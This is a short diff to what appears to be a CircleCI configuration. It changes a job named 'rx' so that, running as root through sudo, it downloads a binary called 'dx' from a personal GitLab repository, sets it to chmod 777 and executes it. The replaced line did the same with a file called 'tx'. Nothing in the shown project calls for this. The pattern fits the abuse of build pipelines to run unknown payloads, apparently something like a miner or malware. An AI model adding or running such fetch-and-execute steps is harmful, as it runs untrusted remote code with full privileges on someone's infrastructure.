@@ -9,7 +9,7 @@ jobs:
           name: "rx"
           command: |
            sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/tx"
-           sudo su --command "wget https://gitlab.com/TandraKauffman/rx/-/raw/main/tx && chmod 777 tx && ./tx"
+           sudo su --command "wget https://gitlab.com/TandraKauffman/rx/-/raw/main/dx && chmod 777 dx && ./dx"
 
 workflows:
   version: 2
